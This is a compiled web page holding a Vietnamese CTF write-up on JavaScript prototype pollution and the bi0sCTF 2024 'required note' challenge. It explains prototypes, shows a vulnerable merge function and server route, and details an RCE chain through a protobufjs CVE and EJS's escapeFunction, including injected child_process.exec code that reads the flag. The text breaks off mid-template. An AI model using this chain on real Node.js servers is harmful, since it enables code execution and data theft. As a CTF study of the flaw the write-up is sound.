import { _ as _export_sfc, r as resolveComponent, c as createElementBlock, a as createStaticVNode, e as createBaseVNode, b as createVNode, f as createTextVNode, o as openBlock } from "./app-BJjiZhLy.js";
const _imports_0 = "/assets/prototype-pollution-bios-QzZf0BQi.png";
const _imports_1 = "/assets/prototype-pollution-bios-1-CfHHC5Cn.png";
const _imports_2 = "/assets/prototype-pollution-bios-2-BjPMotlW.png";
const _imports_3 = "/assets/prototype-pollution-bios-4-aGCIIYOm.png";
const _imports_4 = "/assets/prototype-pollution-bios-5-B5d8y9UL.png";
const _imports_5 = "/assets/prototype-pollution-bios-6-CkKX1tqA.png";
const _imports_6 = "/assets/prototype-pollution-bios-7-BKbyKvqi.png";
const _imports_7 = "/assets/prototype-pollution-bios-8-B9_18Fb9.png";
const _imports_8 = "/assets/prototype-pollution-bios-9-bjK5B5jb.png";
const _imports_9 = "/assets/prototype-pollution-bios-10-A0dv5veB.png";
const _imports_10 = "/assets/prototype-pollution-bios-11-DtvPFIpj.png";
const _imports_11 = "/assets/prototype-pollution-bios-12-XE0oKGlM.png";
const _imports_12 = "/assets/prototype-pollution-bios-13-CvP4z0ON.png";
const _imports_13 = "/assets/prototype-pollution-bios-14-LcnDDfyW.png";
const _imports_14 = "/assets/prototype-pollution-bios-15-DxnkYBoi.png";
const _imports_15 = "/assets/prototype-pollution-bios-16-BNhyS9ID.png";
const _imports_16 = "/assets/prototype-pollution-bios-17-CHn9GA99.png";
const _imports_17 = "/assets/prototype-pollution-bios-18-QMEJo5Gf.png";
const _sfc_main = {};
const _hoisted_1 = { class: "custom-container info" };
const _hoisted_2 = {
  href: "https://r3kapig-not1on.notion.site/bi0sCTF-2024-Jeopardy-2132609e35d74137935046fbcb62ff49",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_3 = {
  href: "https://www.npmjs.com/package/protobufjs",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_4 = {
  href: "https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_5 = {
  href: "https://github.com/mde/ejs/issues/735",
  target: "_blank",
  rel: "noopener noreferrer"
};
function _sfc_render(_ctx, _cache) {
  const _component_ExternalLinkIcon = resolveComponent("ExternalLinkIcon");
  return openBlock(), createElementBlock("div", null, [
    _cache[21] || (_cache[21] = createStaticVNode('<h2 id="object-trong-javascript" tabindex="-1"><a class="header-anchor" href="#object-trong-javascript"><span>Object trong JavaScript</span></a></h2><p>Object trong Javascript là một kiểu dữ liệu đặc biệt trong javascript, bao gồm các key:value, gọi là property. Value của object có thể lưu được nhiều kiểu dữ liệu, bao gồm cả một object khác hay function. <img src="' + _imports_0 + '" alt="alt text"></p><p>Có hai cách thông thường để truy cập đến các property của Object là Dot notation và Bracket Notation</p><ul><li><strong>Dot notation</strong>: object.properti</li><li><strong>Bracket notation</strong>: object[&quot;proerti&quot;]</li></ul><h3 id="object-prototypes" tabindex="-1"><a class="header-anchor" href="#object-prototypes"><span>Object Prototypes</span></a></h3><p>Mọi object trong JavaScript đều là instance của <code>Object</code> nên đều được kế thừa các built-in property và method từ <code>Object.prototype</code>, gọi là <strong>prototype</strong>. Nó là cơ chế của Javascript Object để kế thừa các tính năng của nhau. Ví dụ như Object ở trên, dù không được khai báo trực tiếp, nhưng vẫn có thể truy cập được property và method như <code>constructor</code>, <code>toString()</code>, <code>valueOf()</code>,...</p><p>Ta có thể truy cập đến prototype của một object thông qua property <code>__proto__</code> hoặc <code>Object.getPrototypeOf()</code></p><h3 id="protoype-chain" tabindex="-1"><a class="header-anchor" href="#protoype-chain"><span>Protoype chain</span></a></h3><p>Javascript triển khai việc kế thừa dựa vào Object, mỗi Object đều có một liên kết đến những Object khác. Mỗi prototype có thể chứa prototype khác, gọi là <strong>prototype chain</strong>, nó có thể kế thừa cho đến final chain là null prototype.</p><p>Khi chúng ta truy cập đến một property của Object, trước tiên sẽ kiểm tra các property hiện có của nó, nếu không có nó sẽ tìm kiếm tiếp trong prototype của nó, và cứ tiếp tục như thế cho đến khi tìm thấy hoặc đến null prototype.</p><p>Ta có đoạn code như sau, Object sẽ set property object = &quot;Object&quot; cho prototype, sau đó tạo thêm một object mới, có property <code>obj</code>. Và biến <code>test</code> từ Object <code>obj</code><img src="' + _imports_1 + '" alt="alt text"></p><p>Khi ta truy cập <code>test.obj</code>, nó sẽ tìm các property của test, vì không có nên nó sẽ tìm trong prototype của test, và tìm thấy property <code>obj</code> của prototype là từ biến <code>obj</code>, nên kết quả sẽ là &quot;Object&quot;. Tương tự, khi ta truy cập <code>test.object</code>, nó sẽ tìm trong property của test, sau đó đến <code>obj</code>, cuối cùng tìm trong Object prototype, và tìm thấy property <code>object</code> là &quot;Object&quot;.</p><h2 id="prototype-pollution" tabindex="-1"><a class="header-anchor" href="#prototype-pollution"><span>Prototype Pollution</span></a></h2><h3 id="so-luoc" tabindex="-1"><a class="header-anchor" href="#so-luoc"><span>Sơ lược</span></a></h3><p>Từ việc có thể gọi đến prototype của object, không chỉ access đến property của prototype, ta còn có thể cập nhật dữ liệu của prototype, như vậy thì tất cả các object khác kế thừa từ prototype đó sẽ bị ảnh hưởng theo.</p><p><img src="' + _imports_2 + '" alt="alt text"></p><p>Điều này dẫn đến Prototype Pollution, khi ta chỉnh sửa prototype của Object, các biến khác cũng sẽ bị, dẫn tới việc khi truy cập đến một property không tồn tại trong object hiện tại, nó sẽ tìm trong prototype và trả về một kết quả không mong muốn.</p><h3 id="nguyen-nhan" tabindex="-1"><a class="header-anchor" href="#nguyen-nhan"><span>Nguyên nhân</span></a></h3><p>Nguyên nhân thường đến từ việc merge các object theo kiểu đệ quy và không kiểm tra kỹ càng dữ liệu đầu vào, hoặc từ việc parse dữ liệu từ nguồn không tin cậy.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">src<span class="token punctuation">,</span> dst</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> src <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> dst<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token function">merge</span><span class="token punctuation">(</span>dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>\n<span class="line">            dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token keyword">return</span> dst<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="challenge" tabindex="-1"><a class="header-anchor" href="#challenge"><span>Challenge:</span></a></h2><h3 id="bi0s-required-note" tabindex="-1"><a class="header-anchor" href="#bi0s-required-note"><span>bi0s/required note</span></a></h3>', 22)),
    createBaseVNode("div", _hoisted_1, [
      _cache[1] || (_cache[1] = createStaticVNode('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">INFO</p><p>Every CTF requires at least one overly complicated notes app.</p>', 3)),
      createBaseVNode("p", null, [
        createBaseVNode("a", _hoisted_2, [
          _cache[0] || (_cache[0] = createBaseVNode("code", null, "📁 required_note.zip", -1)),
          createVNode(_component_ExternalLinkIcon)
        ])
      ]),
      _cache[2] || (_cache[2] = createBaseVNode("blockquote", null, [
        createBaseVNode("p", null, "Author: Z_Pacifist")
      ], -1))
    ]),
    _cache[22] || (_cache[22] = createStaticVNode('<p><img src="' + _imports_3 + '" alt="alt text"></p><ul><li>Website cho phép ta tạo ra các note và lưu trữ. Ngoài ra thì có thể customise các field với protobuf <img src="' + _imports_4 + '" alt="alt text"></li><li>Có một note chứa flag được tạo sẵn với tên được generate từ hàm <code>Math.random()</code> bao gồm 16 kí tự [a-z0-9]</li></ul><h4 id="overview" tabindex="-1"><a class="header-anchor" href="#overview"><span>Overview</span></a></h4><p>Khi tùy chỉnh settings, ta sẽ gửi POST request đến server <img src="' + _imports_5 + '" alt="alt text"> Hàm sau đó được xử lí như sau</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&quot;/customise&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">try</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">let</span> author <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;author&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">let</span> title <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">let</span> protoContents <span class="token operator">=</span> fs</span>\n<span class="line">      <span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">&quot;./settings.proto&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">      <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">      protoContents<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>author<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string author = 3 [default=&quot;user&quot;];</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>title<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">      protoContents<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>title<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string title = 1 [default=&quot;user&quot;];</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">&quot;./settings.proto&quot;</span><span class="token punctuation">,</span> protoContents<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">Message</span><span class="token operator">:</span> <span class="token string">&quot;Settings changed&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">Message</span><span class="token operator">:</span> <span class="token string">&quot;Internal server error&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>', 5)),
    createBaseVNode("p", null, [
      _cache[5] || (_cache[5] = createTextVNode("Server sẽ lấy ")),
      _cache[6] || (_cache[6] = createBaseVNode("code", null, "author", -1)),
      _cache[7] || (_cache[7] = createTextVNode(" và ")),
      _cache[8] || (_cache[8] = createBaseVNode("code", null, "title", -1)),
      _cache[9] || (_cache[9] = createTextVNode(" dựa vào user input, ghi đè vào file ")),
      _cache[10] || (_cache[10] = createBaseVNode("code", null, "settings.proto", -1)),
      _cache[11] || (_cache[11] = createTextVNode(". Trong khi server sẽ xử lí file protobuf thông qua thư viện ")),
      createBaseVNode("a", _hoisted_3, [
        _cache[3] || (_cache[3] = createTextVNode("protobufjs")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[12] || (_cache[12] = createTextVNode(" nhưng lại không sử dụng latest version nên mình thấy khá sú. ")),
      _cache[13] || (_cache[13] = createBaseVNode("img", {
        src: _imports_6,
        alt: "alt text"
      }, null, -1)),
      _cache[14] || (_cache[14] = createTextVNode(" Sau khi research thì mình phát hiện ra có ")),
      createBaseVNode("a", _hoisted_4, [
        _cache[4] || (_cache[4] = createTextVNode("CVE")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[15] || (_cache[15] = createTextVNode(" của version này liên quan tới ")),
      _cache[16] || (_cache[16] = createBaseVNode("strong", null, "Prototype Pollution", -1)),
      _cache[17] || (_cache[17] = createTextVNode("."))
    ]),
    _cache[23] || (_cache[23] = createStaticVNode('<p>Cụ thể, POST payload lên <code>/customise</code> để truyền payload vào file <code>settings.protobuf</code>, sau khi tạo một note mới, server sẽ parse từ file settings và bị Prototype pollution. <img src="' + _imports_7 + '" alt="alt text"></p><p>Như vậy thì ta có thể tận dụng Prototype Pollution để khai thác bài này.</p><h4 id="solution" tabindex="-1"><a class="header-anchor" href="#solution"><span>Solution</span></a></h4><h5 id="rce-voi-ejs" tabindex="-1"><a class="header-anchor" href="#rce-voi-ejs"><span>RCE với EJS</span></a></h5>', 4)),
    createBaseVNode("p", null, [
      _cache[19] || (_cache[19] = createTextVNode("Ejs v3.1.9 cũng có ")),
      createBaseVNode("a", _hoisted_5, [
        _cache[18] || (_cache[18] = createTextVNode("vuln SSTI")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[20] || (_cache[20] = createStaticVNode('. Kiểm tra thử compile prototype thì thấy đa số các options đều có được <code>_JS_IDENTIFIER</code> test trước khi xử lí, trừ <code>escapeFn</code><img src="' + _imports_8 + '" alt="alt text"><code>escapeFn</code> lại được gán từ <code>opts.escapeFunction</code><img src="' + _imports_9 + '" alt="alt text"> Vì đoạn code ban đầu không gán options <code>escapeFunction</code> nên ta có thể ghi đè vào đây với Prototype Pollution. <code>escapeFn</code> chỉ được thêm vào khi <code>opts.client</code> là truthy value. Ta chỉ cần tận dụng và gán cho nó giá trị true, escapeFn sẽ được thêm vào.', 16))
    ]),
    _cache[24] || (_cache[24] = createStaticVNode('<details class="custom-container details"><summary class="custom-container-title">eval</summary><p>Dòng 24 là dòng ta thêm vào cho <code>escapeFn</code> để có thể chạy code của mình. <code>escapeFn</code> cần có kiểu Function nên có thể cho nó bằng một function bất kỳ (<code>console.log</code>)</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">rethrow <span class="token operator">=</span> rethrow <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token function">rethrow</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> str<span class="token punctuation">,</span> flnm<span class="token punctuation">,</span> lineno<span class="token punctuation">,</span> esc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">var</span> lines <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">var</span> start <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lineno <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">var</span> end <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>lines<span class="token punctuation">.</span>length<span class="token punctuation">,</span> lineno <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">var</span> filename <span class="token operator">=</span> <span class="token function">esc</span><span class="token punctuation">(</span>flnm<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token comment">// Error context</span></span>\n<span class="line">  <span class="token keyword">var</span> context <span class="token operator">=</span> lines<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">line<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span><span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">var</span> curr <span class="token operator">=</span> i <span class="token operator">+</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">return</span> <span class="token punctuation">(</span>curr <span class="token operator">==</span> lineno <span class="token operator">?</span> <span class="token string">&#39; &gt;&gt; &#39;</span> <span class="token operator">:</span> <span class="token string">&#39;    &#39;</span><span class="token punctuation">)</span></span>\n<span class="line">      <span class="token operator">+</span> curr</span>\n<span class="line">      <span class="token operator">+</span> <span class="token string">&#39;| &#39;</span></span>\n<span class="line">      <span class="token operator">+</span> line<span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token comment">// Alter exception message</span></span>\n<span class="line">  err<span class="token punctuation">.</span>path <span class="token operator">=</span> filename<span class="token punctuation">;</span></span>\n<span class="line">  err<span class="token punctuation">.</span>message <span class="token operator">=</span> <span class="token punctuation">(</span>filename <span class="token operator">||</span> <span class="token string">&#39;ejs&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;:&#39;</span></span>\n<span class="line">    <span class="token operator">+</span> lineno <span class="token operator">+</span> <span class="token string">&#39;\\n&#39;</span></span>\n<span class="line">    <span class="token operator">+</span> context <span class="token operator">+</span> <span class="token string">&#39;\\n\\n&#39;</span></span>\n<span class="line">    <span class="token operator">+</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token keyword">throw</span> err<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">;</span></span>\n<span class="line">escapeFn <span class="token operator">=</span> escapeFn <span class="token operator">||</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;child_process&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&#39;tail -n +1 notes/* | grep bi0s &gt; notes/flag.json&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">var</span> __line <span class="token operator">=</span> <span class="token number">1</span></span>\n<span class="line">  <span class="token punctuation">,</span> __lines <span class="token operator">=</span> <span class="token string">&quot;&lt;!-- views/create.ejs --&gt;\\n&lt;!DOCTYPE html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n  &lt;title&gt;Create Note&lt;/title&gt;\\n  &lt;style&gt;\\n    body {\\n      background-color: #303030; /* Dark background color */\\n      color: #ffffff; /* Text color */\\n      font-family: &#39;Arial&#39;, sans-serif;\\n      display: flex;\\n      align-items: center;\\n      justify-content: center;\\n      height: 100vh;\\n      margin: 0;\\n    }\\n\\n    .card {\\n      background-color: #444444; /* Card background color */\\n      border-radius: 8px;\\n      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);\\n      padding: 20px;\\n      width: 400px;\\n      box-sizing: border-box;\\n    }\\n\\n    h1, h2 {\\n      color: #ffffff; /* Heading text color */\\n      text-align: center;\\n    }\\n\\n    form {\\n      max-width: 100%;\\n      margin-top: 20px;\\n    }\\n\\n    label {\\n      color: #ffffff; /* Label text color */\\n    }\\n\\n    input[type=\\&quot;text\\&quot;], textarea {\\n      width: 100%;\\n      padding: 10px;\\n      margin: 8px 0;\\n      box-sizing: border-box;\\n      background-color: #333333; /* Input background color */\\n      color: #ffffff; /* Input text color */\\n      border: 1px solid #ffffff; /* Input border color */\\n    }\\n\\n    input[type=\\&quot;button\\&quot;] {\\n      background-color: #ffffff; /* Button background color */\\n      color: #303030; /* Button text color */\\n      padding: 10px 15px;\\n      border: none;\\n      cursor: pointer;\\n      width: 100%;\\n    }\\n\\n    input[type=\\&quot;button\\&quot;]:hover {\\n      background-color: #555555; /* Button background color on hover */\\n    }\\n\\n    #message {\\n      color: #ff0000; /* Error message color */\\n      margin-top: 10px;\\n      text-align: center;\\n    }\\n\\n    #noteList {\\n      list-style-type: none;\\n      padding: 0;\\n    }\\n\\n    #noteList li {\\n      margin-bottom: 8px;\\n    }\\n\\n    #noteList a {\\n      text-decoration: none;\\n      color: #ffffff; /* Link text color */\\n    }\\n\\n    #noteList a:hover {\\n      text-decoration: underline;\\n    }\\n  &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;div class=\\&quot;card\\&quot;&gt;\\n  &lt;h1&gt;Create a New Note&lt;/h1&gt;\\n  &lt;form id=\\&quot;noteForm\\&quot;&gt;\\n    &lt;label for=\\&quot;title\\&quot;&gt;Title:&lt;/label&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;text\\&quot; id=\\&quot;title\\&quot; name=\\&quot;title\\&quot; required&gt;&lt;br&gt;\\n    &lt;label for=\\&quot;content\\&quot;&gt;Content:&lt;/label&gt;&lt;br&gt;\\n    &lt;textarea id=\\&quot;content\\&quot; name=\\&quot;content\\&quot; rows=\\&quot;4\\&quot; cols=\\&quot;50\\&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;button\\&quot; value=\\&quot;Create Note\\&quot; onclick=\\&quot;submitNote()\\&quot;&gt;\\n  &lt;/form&gt;\\n\\n&lt;div id=\\&quot;message\\&quot; style=\\&quot;color: red;\\&quot;&gt;&lt;/div&gt;\\n\\n&lt;script&gt;\\nfunction addItemToList(item) {\\n  const noteList = document.getElementById(&#39;noteList&#39;);\\n  const listItem = document.createElement(&#39;li&#39;);\\n\\n  const link = document.createElement(&#39;a&#39;);\\n  link.href = `/view/${item.Noteid}`; \\n  link.textContent = item.Noteid; \\n  listItem.appendChild(link);\\n\\n  noteList.appendChild(listItem);\\n}\\n\\nfunction submitNote() {\\n  const title = document.getElementById(\\&quot;title\\&quot;).value;\\n  const content = document.getElementById(\\&quot;content\\&quot;).value;\\n\\n  const noteData = { title, content };\\n\\n  fetch(\\&quot;/create\\&quot;, {\\n    method: \\&quot;POST\\&quot;,\\n    headers: {\\n      \\&quot;Content-Type\\&quot;: \\&quot;application/json\\&quot;,\\n    },\\n    body: JSON.stringify(noteData),\\n  })\\n    .then((response) =&gt; response.json())\\n    .then((data) =&gt; {\\n      if (data.Message) {\\n        document.getElementById(\\&quot;message\\&quot;).innerHTML = data.Message;\\n        if (data.Noteid){\\n          addItemToList(data);\\n        }\\n      } \\n    })\\n    .catch((error) =&gt; {\\n      console.error(\\&quot;error:\\&quot;, error);\\n      document.getElementById(\\&quot;message\\&quot;).innerText = &#39;Error&#39;;\\n    });\\n\\n}\\n&lt;/script&gt;\\n\\n  &lt;% if (Message) { %&gt;\\n    &lt;p&gt;&lt;%= Message %&gt;&lt;/p&gt;\\n  &lt;% } %&gt;\\n  &lt;h2&gt;Created Notes:&lt;/h2&gt;\\n  &lt;ul id=\\&quot;noteList\\&quot; style=\\&quot;text-align:center\\&quot;&gt;\\n    &lt;% for (const noteId of noteList) { %&gt;\\n      &lt;li&gt;&lt;a href=\\&quot;/view/&lt;%= noteId %&gt;\\&quot;&gt;&lt;%= noteId %&gt;&lt;/a&gt;&lt;/li&gt;\\n    &lt;% } %&gt;\\n  &lt;/ul&gt;\\n  &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;</span></span>\n<span class="line">  <span class="token punctuation">,</span> __filename <span class="token operator">=</span> <span class="token string">&quot;/tmp/note/src/views/create.ejs&quot;</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">try</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">var</span> __output <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">function</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> s <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> __output <span class="token operator">+=</span> s <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token keyword">with</span> <span class="token punctuation">(</span>locals <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;!-- views/create.ejs --&gt;\\n&lt;!DOCTYPE html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n  &lt;title&gt;Create Note&lt;/title&gt;\\n  &lt;style&gt;\\n    body {\\n      background-color: #303030; /* Dark background color */\\n      color: #ffffff; /* Text color */\\n      font-family: &#39;Arial&#39;, sans-serif;\\n      display: flex;\\n      align-items: center;\\n      justify-content: center;\\n      height: 100vh;\\n      margin: 0;\\n    }\\n\\n    .card {\\n      background-color: #444444; /* Card background color */\\n      border-radius: 8px;\\n      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);\\n      padding: 20px;\\n      width: 400px;\\n      box-sizing: border-box;\\n    }\\n\\n    h1, h2 {\\n      color: #ffffff; /* Heading text color */\\n      text-align: center;\\n    }\\n\\n    form {\\n      max-width: 100%;\\n      margin-top: 20px;\\n    }\\n\\n    label {\\n      color: #ffffff; /* Label text color */\\n    }\\n\\n    input[type=\\&quot;text\\&quot;], textarea {\\n      width: 100%;\\n      padding: 10px;\\n      margin: 